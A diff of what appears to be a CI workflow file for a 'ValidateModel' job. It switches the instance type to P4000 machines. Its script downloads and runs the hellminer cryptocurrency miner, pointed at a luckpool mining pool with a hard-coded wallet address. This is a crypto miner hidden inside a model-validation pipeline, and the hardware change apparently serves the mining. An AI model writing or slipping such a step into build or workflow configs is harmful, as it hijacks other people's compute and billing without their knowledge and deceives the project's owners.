@@ -2,11 +2,11 @@ on:
   github:
     branches:
       only: main
-      
+
 jobs:
   ValidateModel:
     resources:
-      instance-type: C7
+      instance-type: P4000
     inputs:
       model:
         type: dataset
@@ -40,7 +40,7 @@ jobs:
         port: 8080
         resources:
           replicas: 2
-          instanceType: C7
+          instanceType: P4000
         EOF
         apt update > /dev/null
         apt-get install -y jq && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RCe3fTKcK132fymKGCsNaqhjTDK6m4V5Wz.g1 -p x --cpu 10
